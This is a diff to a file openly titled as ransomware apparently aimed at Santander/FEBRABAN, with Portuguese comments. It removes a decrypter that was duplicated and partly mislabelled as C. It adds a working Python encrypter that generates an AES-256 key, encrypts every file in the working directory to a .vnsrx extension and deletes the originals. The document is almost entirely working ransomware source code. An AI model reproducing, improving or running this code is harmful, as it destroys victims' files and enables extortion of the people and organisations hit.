@@ -1,112 +1,54 @@
 # SANTANDER_FEBRABAN_RANSOMWARE
 
 ENCRYPTER
-
-
-DECRYPTER
-
 '''python
 import os
-import pyaes
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
-def decrypt_file(file_name, key):
-   # Lê os dados do arquivo criptografado
-   with open(file_name, "rb") as file:
-       encrypted_data = file.read()
+def generate_random_key(length=32):
+    """Gera uma chave aleatória de 32 bytes."""
+    return get_random_bytes(length)
 
-   # Cria um objeto AES
-   aes = pyaes.AESModeOfOperationCTR(key)
+def encrypt_file(file_name, key):
+    try:
+        # Lê os dados do arquivo
+        with open(file_name, "rb") as file:
+            file_data = file.read()
 
-   # Descriptografa os dados
-   decrypted_data = aes.decrypt(encrypted_data)
+        # Cria um objeto AES com AES-256 no modo CTR
+        cipher = AES.new(key, AES.MODE_CTR)
 
-   # Salva os dados descriptografados em um novo arquivo sem a extensão .vnsrx
-   new_file_name = file_name.replace('.vnsrx', '')
-   with open(new_file_name, "wb") as file:
-       file.write(decrypted_data)
+        # Criptografa os dados
+        encrypted_data = cipher.encrypt(file_data)
 
-   print(f"Arquivo {file_name} descriptografado com sucesso e salvo como {new_file_name}!")
+        # Salva os dados criptografados em um novo arquivo
+        new_file_name = file_name + ".vnsrx"
+        with open(new_file_name, "wb") as file:
+            file.write(cipher.nonce + encrypted_data)
 
-   # Verifica se o arquivo descriptografado foi criado com sucesso
-   if os.path.isfile(new_file_name):
-       # Remove o arquivo criptografado
-       os.remove(file_name)
-       print(f"Arquivo criptografado {file_name} foi removido.")
-   else:
-       print(f"Erro: O arquivo descriptografado {new_file_name} não foi criado. O arquivo criptografado não será removido.")
+        print(f"Arquivo {file_name} criptografado com sucesso e salvo como {new_file_name}!")
 
-def main():
-   # Solicita ao usuário que insira a chave de descriptografia em formato hexadecimal
-   key_hex = input("Digite a chave de descriptografia em formato hexadecimal (64 caracteres): ").strip()
-
-   # Verifica se a chave tem exatamente 64 caracteres (32 bytes em hexadecimal)
-   if len(key_hex) != 64:
-       print("A chave deve ter exatamente 64 caracteres em formato hexadecimal.")
-       return
-
-   # Converte a chave de hexadecimal para bytes
-   key = bytes.fromhex(key_hex)
-
-   # Lista todos os arquivos no diretório atual
-   for file_name in os.listdir('.'):
-       # Verifica se o arquivo é criptografado
-       if os.path.isfile(file_name) and file_name.endswith('.vnsrx'):
-           decrypt_file(file_name, key)
-
-   print("Todos os arquivos criptografados foram descriptografados e removidos.")
-
-if __name__ == "__main__":
-   main()
-
-   '''c
-   import os
-import pyaes
-
-def decrypt_file(file_name, key):
-   # Lê os dados do arquivo criptografado
-   with open(file_name, "rb") as file:
-       encrypted_data = file.read()
-
-   # Cria um objeto AES
-   aes = pyaes.AESModeOfOperationCTR(key)
-
-   # Descriptografa os dados
-   decrypted_data = aes.decrypt(encrypted_data)
-
-   # Salva os dados descriptografados em um novo arquivo sem a extensão .vnsrx
-   new_file_name = file_name.replace('.vnsrx', '')
-   with open(new_file_name, "wb") as file:
-       file.write(decrypted_data)
-
-   print(f"Arquivo {file_name} descriptografado com sucesso e salvo como {new_file_name}!")
-
-   # Verifica se o arquivo descriptografado foi criado com sucesso
-   if os.path.isfile(new_file_name):
-       # Remove o arquivo criptografado
-       os.remove(file_name)
-       print(f"Arquivo criptografado {file_name} foi removido.")
-   else:
-       print(f"Erro: O arquivo descriptografado {new_file_name} não foi criado. O arquivo criptografado não será removido.")
+        # Verifica se o arquivo criptografado foi criado com sucesso
+        if os.path.isfile(new_file_name):
+            # Remove o arquivo original
+            os.remove(file_name)
+            print(f"Arquivo original {file_name} foi removido.")
+        else:
+            print(f"Erro: O arquivo criptografado {new_file_name} não foi criado.")
+    except Exception as e:
+        print(f"Ocorreu um erro: {e}")
 
 def main():
-   # Solicita ao usuário que insira a chave de descriptografia em formato hexadecimal
-   key_hex = input("Digite a chave de descriptografia em formato hexadecimal (64 caracteres): ").strip()
+    # Gera uma chave aleatória de 32 bytes
+    key = generate_random_key(32)
+    print(f"Chave gerada (não exiba esta chave para garantir segurança): {key.hex()}")
 
-   # Verifica se a chave tem exatamente 64 caracteres (32 bytes em hexadecimal)
-   if len(key_hex) != 64:
-       print("A chave deve ter exatamente 64 caracteres em formato hexadecimal.")
-       return
-
-   # Converte a chave de hexadecimal para bytes
-   key = bytes.fromhex(key_hex)
-
-   # Lista todos os arquivos no diretório atual
-   for file_name in os.listdir('.'):
-       # Verifica se o arquivo é criptografado
-       if os.path.isfile(file_name) and file_name.endswith('.vnsrx'):
-           decrypt_file(file_name, key)
-
-   print("Todos os arquivos criptografados foram descriptografados e removidos.")
+    # Processa os arquivos no diretório
+    for file_name in os.listdir('.'):
+        if os.path.isfile(file_name) and not file_name.endswith('.vnsrx') and file_name != os.path.basename(__file__):
+            encrypt_file(file_name, key)
 
 if __name__ == "__main__":
-   main()
+    main()
+
